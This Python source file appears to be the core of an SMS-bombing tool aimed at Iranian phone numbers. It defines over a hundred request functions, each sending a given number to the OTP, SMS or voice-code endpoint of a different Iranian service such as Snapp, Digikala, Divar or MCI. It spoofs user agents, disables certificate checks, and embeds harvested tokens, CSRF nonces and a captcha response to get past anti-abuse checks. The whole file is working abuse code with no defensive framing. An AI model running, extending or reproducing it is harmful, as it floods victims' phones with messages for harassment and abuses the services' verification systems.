from requests import post, get
from user_agent import generate_user_agent
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


kon = {
    "User-Agent": generate_user_agent(),
    "Accept": "application/json",
    "Content-Type": "application/json"
}

SERVICES = {

    'snapp': lambda num: post(
        url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
        json={"cellphone": f"+98{num}"},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'tapsi': lambda num: post(
        url="https://tap33.me/api/v2/user",
        json={"credential": {"phoneNumber": f"0{num}", "role": "PASSENGER"}},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'alibaba': lambda num: post(
        url="https://ws.alibaba.ir/api/v3/account/mobile/otp",
        json={"phoneNumber": f"0{num}"},
        headers=kon,
        timeout=5,
        verify=False
    ),
    

    'snappfood': lambda num: post(
        url="https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass",
        params={
            "lat": "35.774",
            "long": "51.418",
            "sms_apialClient": "WEBSITE",
            "client": "WEBSITE",
            "deviceType": "WEBSITE",
            "appVersion": "8.1.0",
            "UDID": "39c62f64-3d2d-4954-9033-816098559ae4",
            "locale": "fa"
        },
        json={"cellphone": f"0{num}"},
        headers=kon,
        timeout=5,
        verify=False
    ),
    

    'digikala': lambda num: post(
        url="https://api.digikala.com/v1/user/authenticate/",
        json={"username": f"0{num}"},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'banimod': lambda num: post(
        url="https://mobapi.banimode.com/api/v2/auth/request",
        json={"phone": f"0{num}"},
        headers=kon,
        timeout=5,
        verify=False
    ),
    

    'otaghak': lambda num: post(
        url="https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",
        json={"userName": f"0{num}"},
        headers=kon,
        timeout=5,
        verify=False
    ),
    

    'bit24': lambda num: post(
        url="https://bit24.cash/auth/bit24/api/v3/auth/check-mobile",
        json={"mobile": f"0{num}", "country_code": "98"},
        headers=kon,
        timeout=5,
        verify=False
    ),
    

    'rubika': lambda num: post(
        url="https://messengerg2c4.iranlms.ir/",
        json={
            "api_version": "3",
            "method": "sendCode",
            "data": {
                "phone_number": num,
                "send_type": "SMS"
            }
        },
        headers={
            **kon,
            "Host": "messengerg2c4.iranlms.ir",
            "content-type": "text/plain"
        },
        timeout=5,
        verify=False
    ),
    

    'drto': lambda num: get(
        url="https://api.doctoreto.com/api/web/patient/v1/accounts/register",
        params={
            "mobile": num,
            "captcha": "",
            "country_id": 205
        },
        headers=kon,
        timeout=5,
        verify=False
    ),
    

    '3tex': lambda num: post(
        url="https://3tex.io/api/1/users/validation/mobile",
        json={"receptorPhone": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'deniizshop': lambda num: post(
        url="https://deniizshop.com/api/v1/sessions/login_request",
        json={"mobile_phone": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'flightio': lambda num: post(
        url="https://flightio.com/bff/Authentication/CheckUserKey",
        json={"userKey": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'behtarino': lambda num: post(
        url="https://bck.behtarino.com/api/v1/users/phone_verification/",
        json={"phone": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'abantether': lambda num: post(
        url="https://abantether.com/users/register/phone/send/",
        json={"phoneNumber": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'novinbook': lambda num: post(
        url="https://novinbook.com/index.php?route=account/phone",
        data=f"phone={num}&call=yes",
        headers={
            **kon,
            "Content-Type": "application/x-www-form-urlencoded"
        },
        timeout=5,
        verify=False
    ),
    
    'azki': lambda num: get(
        url=f"https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber={num}",
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'pooleno': lambda num: post(
        url="https://api.pooleno.ir/v1/auth/check-mobile",
        json={"mobile": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'emtiyaz': lambda num: post(
        url="https://web.emtiyaz.app/json/login",
        data=f"send=1&cellphone={num}",
        headers={
            **kon,
            "Content-Type": "application/x-www-form-urlencoded"
        },
        timeout=5,
        verify=False
    ),
    
    'divar': lambda num: post(
        url="https://api.divar.ir/v5/auth/authenticate",
        json={"phone": num},
        headers=kon,
        timeout=5,
        verify=False
    ),

    'bama': lambda num: post(
        url="https://bama.ir/signin-checkforcellnumber",
        data=f"cellNumber={num}",
        headers={
            **kon,
            "Content-Type": "application/x-www-form-urlencoded"
        },
        timeout=5,
        verify=False
    ),
    
    'bitbarg': lambda num: post(
        url="https://api.bitbarg.com/api/v1/authentication/registerOrLogin",
        json={"phone": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'takshop': lambda num: post(
        url="https://takshopaccessorise.ir/api/v1/sessions/login_request",
        json={"mobile_phone": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'bitpin': lambda num: post(
        url="https://api.bitpin.ir/v1/usr/sub_phone/",
        json={"phone": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'chamedoon': lambda num: post(
        url="https://chamedoon.com/api/v1/membership/guest/request_mobile_verification",
        json={"mobile": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'kilid': lambda num: get(
        url="https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL",
        params={"mobile": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
      
    'shab': lambda num: post(
        url="https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile",
        json={"mobile": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'itoll': lambda num: post(
        url="https://app.itoll.ir/api/v1/auth/login",
        json={"mobile": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'taaghche': lambda num: post(
        url="https://gw.taaghche.com/v4/site/auth/signup",
        json={"contact": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'namava': lambda num: post(
        url="https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
        json={"UserName": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'sheypoor': lambda num: post(
        url="https://www.sheypoor.com/auth",
        json={"username": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'snapp_ir': lambda num: post(
        url="https://api.snapp.ir/api/v1/sms/link",
        json={"phone": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'a4baz': lambda num: post(
        url="https://a4baz.com/api/web/login",
        json={"cellphone": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'anargift': lambda num: post(
        url="https://api.anargift.com/api/people/auth",
        json={"user": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'nobat': lambda num: post(
        url="https://nobat.ir/api/public/patient/login/phone",
        json={"mobile": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'buskool': lambda num: post(
        url="https://www.buskool.com/send_verification_code",
        json={"phone": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'simkhan': lambda num: post(
        url="https://www.simkhanapi.ir/api/users/registerV2",
        json={"mobileNumber": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'sibirani': lambda num: post(
        url="https://sandbox.sibirani.ir/api/v1/user/invite",
        json={"username": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'hiword': lambda num: post(
        url="https://hiword.ir/wp-json/otp-login/v1/login",
        json={"identifier": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'bit24cash': lambda num: post(
        url="https://api.bit24.cash/api/v3/auth/check-mobile",
        json={"mobile": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
     
    'ghasedak24': lambda num: post(
        url="https://ghasedak24.com/user/ajax_register",
        json={"username": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'tikban': lambda num: post(
        url="https://tikban.com/Account/LoginAndRegister",
        json={"CellPhone": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'digistyle': lambda num: post(
        url="https://www.digistyle.com/users/login-register/",
        json={"loginRegister[email_phone]": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'iranketab': lambda num: post(
        url="https://www.iranketab.ir/account/register",
        json={"UserName": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'ketabchi': lambda num: post(
        url="https://ketabchi.com/api/v1/auth/requestVerificationCode",
        json={"phoneNumber": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'offdecor': lambda num: post(
        url="https://www.offdecor.com/index.php?route=account/login/sendCode",
        json={"phone": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'exo': lambda num: post(
        url="https://exo.ir/index.php?route=account/mobile_login",
        json={"mobile_number": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'shahrfarsh': lambda num: post(
        url="https://shahrfarsh.com/Account/Login",
        data=f"phoneNumber={num}",
        headers={
            **kon,
            "Content-Type": "application/x-www-form-urlencoded"
        },
        timeout=5,
        verify=False
    ),
    
    'takfarsh': lambda num: post(
        url="https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php",
        json={"phone_email": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'beheshticarpet': lambda num: post(
        url="https://shop.beheshticarpet.com/my-account/",
        json={"billing_mobile": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'khanoumi': lambda num: post(
        url="https://www.khanoumi.com/accounts/sendotp",
        json={"mobile": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'rojashop': lambda num: post(
        url="https://rojashop.com/api/auth/sendOtp",
        json={"mobile": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'dadpardaz': lambda num: post(
        url="https://dadpardaz.com/advice/getLoginConfirmationCode",
        json={"mobile": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
  
    'mashinbank': lambda num: post(
        url="https://mashinbank.com/api2/users/check",
        json={"mobileNumber": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'pezeshket': lambda num: post(
        url="https://api.pezeshket.com/core/v1/auth/requestCode",
        json={"mobileNumber": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'virgool': lambda num: post(
        url="https://virgool.io/api/v1.4/auth/verify",
        json={"method": "phone", "identifier": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'timcheh': lambda num: post(
        url="https://api.timcheh.com/auth/otp/send",
        json={"mobile": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'paklean': lambda num: post(
        url="https://client.api.paklean.com/user/resendCode",
        json={"username": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'mobogift': lambda num: post(
        url="https://mobogift.com/signin",
        json={"username": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'iranicard': lambda num: post(
        url="https://api.iranicard.ir/api/v1/register",
        json={"mobile": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
      
    'cinematicket': lambda num: post(
        url="https://cinematicket.org/api/v1/users/signup",
        json={"phone_number": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'irantic': lambda num: post(
        url="https://www.irantic.com/api/login/request",
        json={"mobile": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'kafegheymat': lambda num: post(
        url="https://kafegheymat.com/shop/getLoginSms",
        json={"phone": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'snappexpress': lambda num: post(
        url="https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass",
        params={
            "client": "PWA",
            "optionalClient": "PWA",
            "deviceType": "PWA",
            "appVersion": "5.6.6",
            "optionalVersion": "5.6.6",
            "UDID": "bb65d956-f88b-4fec-9911-5f94391edf85"
        },
        json={"cellphone": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'delino': lambda num: post(
        url="https://www.delino.com/user/register",
        json={"mobile": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'alopeyk': lambda num: post(
        url="https://alopeyk.com/api/sms/send.php",
        json={"phone": num},
        headers=kon,
        timeout=5,
        verify=False
    ),

    'digikalajet': lambda num: post(
        url="https://api.digikalajet.ir/user/login-register/",
        json={"phone": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'melix': lambda num: post(
        url="https://melix.shop/site/api/v1/user/otp",
        json={"mobile": num},
        headers=kon,
        timeout=5,
        verify=False
    ),

    'delino_restaurant': lambda num: post(
        url="https://restaurant.delino.com/user/register",
        json={
            "apiToken": "VyG4uxayCdv5hNFKmaTeMJzw3F95sS9DVMXzMgvzgXrdyxHJGFcranHS2mECTWgq",
            "clientSecret": "7eVdaVsYXUZ2qwA9yAu7QBSH2dFSCMwq",
            "device": "web",
            "username": num
        },
        headers=kon,
        timeout=5,
        verify=False
    ),
     
    'dastkhat': lambda num: post(
        url="https://dastkhat-isad.ir/api/v1/user/store",
        json={"mobile": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'sibbank': lambda num: post(
        url="https://api.sibbank.ir/v1/auth/login",
        json={"phone_number": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'miare': lambda num: post(
        url="https://www.miare.ir/api/otp/driver/request/",
        json={"phone_number": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'arshiyan': lambda num: post(
        url="https://api.arshiyan.com/send_code",
        json={"country_code": "98", "phone_number": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'alopeyk_safir': lambda num: post(
        url="https://api.alopeyk.com/safir-service/api/v1/login",
        json={"phone": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'dadhesab': lambda num: post(
        url="https://api.dadhesab.ir/user/entry",
        json={"username": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'dosma': lambda num: post(
        url="https://app.dosma.ir/sendverify/",
        json={"username": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'ehteraman': lambda num: post(
        url="https://api.ehteraman.com/api/request/otp",
        json={"mobile": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'mci': lambda num: post(
        url="https://api-ebcom.mci.ir/services/auth/v1.0/otp",
        json={"msisdn": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'hbbs': lambda num: post(
        url="https://api.hbbs.ir/authentication/SendCode",
        json={"MobileNumber": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'iranamlaak': lambda num: post(
        url="https://api.iranamlaak.net/authenticate/send/otp/to/mobile/via/sms",
        json={"AgencyMobile": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'kcd': lambda num: post(
        url="https://api.kcd.app/api/v1/auth/login",
        json={"mobile": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'mazoocandle': lambda num: post(
        url="https://mazoocandle.ir/login",
        json={"phone": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'ostadkr': lambda num: post(
        url="https://api.ostadkr.com/login",
        json={"mobile": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
  
    'rayshomar': lambda num: post(
        url="https://api.rayshomar.ir/api/Register/RegistrMobile",
        json={"MobileNumber": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'refahtea': lambda num: post(
        url="https://refahtea.ir/wp-admin/admin-ajax.php",
        json={"mobile": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'snapp_digital': lambda num: post(
        url="https://digitalsignup.snapp.ir/oauth/drivers/api/v1/otp",
        json={"cellphone": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'mamifood': lambda num: post(
        url="https://mamifood.org/Registration.aspx/SendValidationCode",
        json={"Phone": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'offch': lambda num: post(
        url="https://api.offch.com/auth/otp",
        json={"username": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'sibbazar': lambda num: post(
        url="https://sandbox.sibbazar.com/api/v1/user/invite",
        json={"username": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'sabziman': lambda num: post(
        url="https://sabziman.com/wp-admin/admin-ajax.php",
        data=f"action=newphoneexist&phonenumber={num}",
        headers={
            **kon,
            "Content-Type": "application/x-www-form-urlencoded"
        },
        timeout=5,
        verify=False
    ),
    
    'watchonline': lambda num: post(
        url="https://api.watchonline.shop/api/v1/otp/request",
        json={"mobile": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'shadmessenger': lambda num: post(
        url="https://shadmessenger12.iranlms.ir/",
        json={
            "api_version": "3",
            "method": "sendCode",
            "data": {
                "phone_number": num,
                "send_type": "SMS"
            }
        },
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'digify': lambda num: post(
        url="https://apollo.digify.shop/graphql",
        json={
            "operationName": "Mutation",
            "variables": {
                "content": {
                    "phone_number": num
                }
            },
            "query": "mutation Mutation($content: MerchantRegisterOTPSendContent) { merchantRegister { otpSend(content: $content) __typename } }"
        },
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'snappmarket': lambda num: get(
        url=f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={num}",
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'mrbilit': lambda num: get(
        url=f"https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail={num}&source=2&sendTokenIfNot=true",
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'chartex': lambda num: post(
        url="https://api.chartex.net/api/v2/user/validate",
        json={
            "mobile": num,
            "country_code": "IR",
            "provider_code": "RUBIKA"
        },
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'snapptrip': lambda num: post(
        url="https://www.snapptrip.com/register",
        json={
            "lang": "fa",
            "country_id": "860",
            "password": "snaptrippass",
            "mobile_phone": num,
            "country_code": "+98",
            "email": "example@gmail.com"
        },
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'filmnet': lambda num: get(
        url=f"https://api-v2.filmnet.ir/access-token/users/{num}/otp",
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'torob': lambda num: get(
        url=f"https://api.torob.com/a/phone/send-pin/?phone_number={num}",
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'gapim': lambda num: get(
        url=f"https://core.gap.im/v1/user/add.json?mobile=%2B{num}",
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'mydigipay': lambda num: post(
        url="https://app.mydigipay.com/digipay/api/users/send-sms",
        json={
            "cellNumber": num,
            "device": {
                "deviceId": "a16e6255-17c3-431b-b047-3f66d24c286f",
                "deviceModel": "WEB_BROWSER",
                "deviceAPI": "WEB_BROWSER",
                "osName": "WEB"
            }
        },
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'wisgoon': lambda num: post(
        url="https://gateway.wisgoon.com/api/v1/auth/login/",
        json={
            "phone": num,
            "recaptcha-response": "03AGdBq25IQtuwqOIeqhl7Tx1EfCGRcNLW8DHYgdHSSyYb0NUwSj5bwnnew9PCegVj2EurNyfAHYRbXqbd4lZo0VJTaZB3ixnGq5aS0BB0YngsP0LXpW5TzhjAvOW6Jo72Is0K10Al_Jaz7Gbyk2adJEvWYUNySxKYvIuAJluTz4TeUKFvgxKH9btomBY9ezk6mxnhBRQeMZYasitt3UCn1U1Xhy4DPZ0gj8kvY5B0MblNpyyjKGUuk_WRiS_6DQsVd5fKaLMy76U5wBQsZDUeOVDD9CauPUR4W_cNJEQP1aPloEHwiLJtFZTf-PVjQU-H4fZWPvZbjA2txXlo5WmYL4GzTYRyI4dkitn3JmWiLwSdnJQsVP0nP3wKN0LV3D7DjC5kDwM0EthEz6iqYzEEVD-s2eeWKiqBRfTqagbMZQfW50Gdb6bsvDmD2zKV8nf6INvfPxnMZC95rOJdHOY-30XGS2saIzjyvg",
            "token": "e622c330c77a17c8426e638d7a85da6c2ec9f455"
        },
        headers={
            "Host": "gateway.wisgoon.com",
            "content-length": "582",
            "accept": "application/json",
            "save-data": "on",
            "content-type": "application/json",
            "origin": "https://m.wisgoon.com",
            "sec-fetch-site": "same-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://m.wisgoon.com/",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8,fa;q=0.7"
        },
        timeout=5,
        verify=False
    ),
    
    'tagmond': lambda num: post(
        url="https://tagmond.com/phone_number",
        data=f"utf8=%E2%9C%93&phone_number={num}&g-recaptcha-response=",
        headers={
            **kon,
            "Content-Type": "application/x-www-form-urlencoded"
        },
        timeout=5,
        verify=False
    ),
    
    'lendo': lambda num: post(
        url="https://lendo.ir/register?",
        json={
            "_token": "mXBVe062llzpXAxD5EzN4b5yqrSuWJMVPl1dFTV6",
            "mobile": num,
            "password": "ibvvb@3#9nc"
        },
        headers=kon,
        timeout=5,
        verify=False
    ),

    'pakhsh': lambda num: post(
        url="https://www.pakhsh.shop/wp-admin/admin-ajax.php",
        data=f"action=digits_check_mob&countrycode=%2B98&mobileNo={num}&csrf=fdaa7fc8e6&login=2&username=&email=&captcha=&captcha_ses=&json=1&whatsapp=0",
        headers={
            **kon,
            "Content-Type": "application/x-www-form-urlencoded"
        },
        timeout=5,
        verify=False
    ),
    
    'basalam': lambda num: post(
        url="https://api.basalam.com/user",
        json={
            "variables": {
                "mobile": num,
                "query": "mutation verificationCodeRequest($mobile: MobileScalar!) { mobileVerificationCodeRequest(mobile: $mobile) { success } }"
            }
        },
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'see5': lambda num: post(
        url="https://crm.see5.net/api_ajax/sendotp.php",
        json={
            "mobile": num,
            "action": "sendsms"
        },
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'limoome': lambda num: post(
        url="https://my.limoome.com/api/auth/login/otp",
        json={
            "mobileNumber": num,
            "country": "1"
        },
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'mihanpezeshk': lambda num: post(
        url="https://www.mihanpezeshk.com/ConfirmCodeSbm_Patient",
        data=f"_token=bBSxMx7ifcypKJuE8qQEhahIKpcVApWdfZXFkL8R&mobile={num}&recaptcha=",
        headers={
            **kon,
            "Content-Type": "application/x-www-form-urlencoded"
        },
        timeout=5,
        verify=False
    ),
    
    'ifollow': lambda num: post(
        url="https://i.devslop.app/app/ifollow/api/otp.php/",
        data=f"number={num}&state=number&",
        headers={
            **kon,
            "Content-Type": "application/x-www-form-urlencoded"
        },
        timeout=5,
        verify=False
    ),
    
    'tnovin': lambda num: post(
        url="http://shop.tnovin.com/login",
        json={"phone": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'hamlex': lambda num: post(
        url="https://hamlex.ir/register.php",
        data=f"fullname=%D9%85%D9%85%D8%AF&phoneNumber={num}&register=",
        headers={
            **kon,
            "Content-Type": "application/x-www-form-urlencoded"
        },
        timeout=5,
        verify=False
    ),
    
    'moshaveran': lambda num: post(
        url="https://moshaveran724.ir/m/pms.php",
        data=f"againkey={num}&cache=false",
        headers={
            **kon,
            "Content-Type": "application/x-www-form-urlencoded"
        },
        timeout=5,
        verify=False
    ),
    
    'balad': lambda num: post(
        url="https://account.api.balad.ir/api/web/auth/login/",
        json={
            "phone_number": num,
            "os_type": "W"
        },
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'flightio_app': lambda num: post(
        url="https://app.flightio.com/bff/Authentication/CheckUserKey",
        json={
            "userKey": num,
            "userKeyType": 1
        },
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'foodcenter': lambda num: post(
        url="https://www.foodcenter.ir/account/sabtmobile",
        data=f"mobile={num}&__RequestVerificationToken=lqpAP86cm6ubwUoSRlGeHdrLJ90KhrBSHzLZ7_rAQ5dAZT-q__KWOkJ3TRoPtz8Q13HaLVCmcfsB1itFNtrvVbX0xWE1",
        headers={
            **kon,
            "Content-Type": "application/x-www-form-urlencoded"
        },
        timeout=5,
        verify=False
    ),
    
    'homtick': lambda num: post(
        url="https://auth.homtick.com/api/V1/User/GetVerifyCode",
        json={
            "mobileOrEmail": num,
            "deviceCode": "d520c7a8-421b-4563-b955-f5abc56b97ec",
            "firstName": "",
            "lastName": "",
            "password": ""
        },
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'amoomilad': lambda num: post(
        url="https://amoomilad.demo-hoonammaharat.ir/api/v1.0/Account/Sendcode",
        json={
            "Token": "5c486f96df46520d1e4d4a998515b1de02392c9b903a7734ec2798ec55be6e5c",
            "DeviceId": 1,
            "PhoneNumber": num,
            "Helper": 77942
        },
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'ashraafi': lambda num: post(
        url="https://ashraafi.com/wp-admin/admin-ajax.php",
        data=f"action=digits_check_mob&countrycode=%2B98&mobileNo={num}&csrf=54dfdabe34&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail={num}&dig_otp=&dig_nounce=54dfdabe34",
        headers={
            **kon,
            "Content-Type": "application/x-www-form-urlencoded"
        },
        timeout=5,
        verify=False
    ),
 
    'bazidone': lambda num: post(
        url="https://bazidone.com/wp-admin/admin-ajax.php",
        data=f"action=digits_check_mob&countrycode=%2B98&mobileNo={num}&csrf=c0f5d0dcf2&login=1&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&mobmail={num}&dig_otp=&digits_login_remember_me=1&dig_nounce=c0f5d0dcf2",
        headers={
            **kon,
            "Content-Type": "application/x-www-form-urlencoded"
        },
        timeout=5,
        verify=False
    ),
    
    'bigtoys': lambda num: post(
        url="https://www.bigtoys.ir/wp-admin/admin-ajax.php",
        data=f"action=digits_check_mob&countrycode=%2B98&mobileNo={num}&csrf=94cf3ad9a4&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D8%A8%DB%8C%D8%A8%D9%84%DB%8C%D9%84&digregcode=%2B98&digits_reg_mail={num}&digregscode2=%2B98&mobmail2=&digits_reg_password=&dig_otp=&code=&dig_reg_mail=&dig_nounce=94cf3ad9a4",
        headers={
            **kon,
            "Content-Type": "application/x-www-form-urlencoded"
        },
        timeout=5,
        verify=False
    ),
    
    'bitex24': lambda num: get(
        url=f"https://bitex24.com/api/v1/auth/sendSms?mobile={num}&dial_code=0",
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'farsgraphic': lambda num: post(
        url="https://farsgraphic.com/wp-admin/admin-ajax.php",
        data=f"action=digits_check_mob&countrycode=%2B98&mobileNo={num}&csrf=79a35b4aa3&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digits_reg_name=%D9%86%DB%8C%D9%85%D9%86%D9%85%D9%85%D9%86%DB%8C%D8%B3&digits_reg_lastname=%D9%85%D9%86%D8%B3%DB%8C%D8%B2%D8%AA%D9%86&digregscode2=%2B98&mobmail2=&digregcode=%2B98&digits_reg_mail={num}&dig_otp=&code=&dig_reg_mail=&dig_nounce=79a35b4aa3",
        headers={
            **kon,
            "Content-Type": "application/x-www-form-urlencoded"
        },
        timeout=5,
        verify=False
    ),
      
    'mipersia': lambda num: post(
        url="https://www.mipersia.com/wp-admin/admin-ajax.php",
        data=f"action=digits_check_mob&countrycode=%2B98&mobileNo={num}&csrf=2d39af0a72&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail={num}&digregscode2=%2B98&mobmail2=&dig_otp=&code=&dig_reg_mail=&dig_nounce=2d39af0a72",
        headers={
            **kon,
            "Content-Type": "application/x-www-form-urlencoded"
        },
        timeout=5,
        verify=False
    ),

    'tajtehran': lambda num: post(
        url="https://tajtehran.com/RegisterRequest",
        data=f"mobile={num}&password=mamad1234",
        headers={
            **kon,
            "Content-Type": "application/x-www-form-urlencoded"
        },
        timeout=5,
        verify=False
    ),
    
    'zivanpet': lambda num: post(
        url="https://zivanpet.com/wp-admin/admin-ajax.php",
        data=f"action=digits_check_mob&countrycode=%2B98&mobileNo={num}&csrf=0864ed5c9b&login=2&username=&email=&captcha=&captcha_ses=&digits=1&json=1&whatsapp=0&digregcode=%2B98&digits_reg_mail={num}&dig_otp=&code=&dig_reg_mail=&dig_nounce=0864ed5c9b",
        headers={
            **kon,
            "Content-Type": "application/x-www-form-urlencoded"
        },
        timeout=5,
        verify=False
    ),
 
    'paklean_voice': lambda num: post(
        url="https://client.api.paklean.com/user/resendVoiceCode",
        json={"username": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'raghamapp': lambda num: post(
        url="https://web.raghamapp.com/api/users/code",
        json={"phone": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'trip_register': lambda num: post(
        url="https://gateway.trip.ir/api/registers",
        json={"CellPhone": num},
        headers=kon,
        timeout=5,
        verify=False
    ),
    
    'trip_totp': lambda num: post(
        url="https://gateway.trip.ir/api/Totp",
        json={"PhoneNumber": num},
        headers=kon,
        timeout=5,
        verify=False
    )
}
